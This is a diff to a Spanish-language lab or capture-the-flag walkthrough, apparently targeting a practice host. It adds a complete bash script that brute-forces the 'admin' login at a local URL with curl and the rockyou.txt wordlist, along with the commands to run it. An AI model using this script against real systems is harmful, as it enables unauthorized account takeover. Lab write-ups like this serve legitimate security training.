@@ -136,9 +136,71 @@ Entornos de desarrollo ============== Apuntar nombres ficticios a IPs de contene
 
 ![image](https://github.com/user-attachments/assets/10ffc1ad-3b56-487c-8660-b2034add0bb4)
 
-Ahora revisamos nuestra nueva URL y encontramos un login
+Ahora revisamos nuestra nueva URL (http://secure-api-register.dl) y encontramos un login
 
 ![image](https://github.com/user-attachments/assets/5168812c-9230-4e5f-8dde-26a4a1e2118b)
+
+Intentemos hacer un login mediante fuerza bruta con el username 'admin' para esto nos creamos una funcion que haga esto
+
+## 1. Creamos el script
+```bash
+nano bruteforce.sh
+```
+
+Agregamos este codigo
+
+```bash
+#!/bin/bash
+
+# Verifica argumentos
+if [ "$#" -ne 1 ]; then
+    echo "Uso: $0 <wordlist.txt>"
+    exit 1
+fi
+
+URL="http://secure-api-register.dl/login"
+USERNAME="admin"
+WORDLIST="$1"
+
+# Verifica que el archivo exista
+if [ ! -f "$WORDLIST" ]; then
+    echo "[!] No se pudo abrir el archivo: $WORDLIST"
+    exit 1
+fi
+
+# Itera sobre cada línea del archivo de contraseñas
+while IFS= read -r PASSWORD; do
+    PASSWORD=$(echo "$PASSWORD" | tr -d '\r')  # Elimina caracteres raros (como \r en wordlists de Windows)
+    echo "[*] Probando: $PASSWORD"
+
+    RESPONSE=$(curl -s -X POST "$URL" \
+        -H "Content-Type: application/json" \
+        -d "{\"username\": \"$USERNAME\", \"password\": \"$PASSWORD\"}" \
+        -c cookie.txt)
+
+    if [[ "$RESPONSE" != *'"message":"Invalid credentials"'* ]]; then
+        echo "[+] Credenciales válidas encontradas: $USERNAME:$PASSWORD"
+        exit 0
+    fi
+done < "$WORDLIST"
+
+echo "[-] No se encontraron credenciales válidas."
+
+```
+
+## 2. Le damos permisos de ejecución: 
+```bash
+chmod +x bruteforce.sh
+```
+
+## 3. Lo ejecutamos
+Yo usare la lista de rockyou.txt pero puedes usar la que desees
+
+```bash
+./bruteforce.sh /usr/share/wordlists/rockyou.txt
+```
+
+
 
 
 
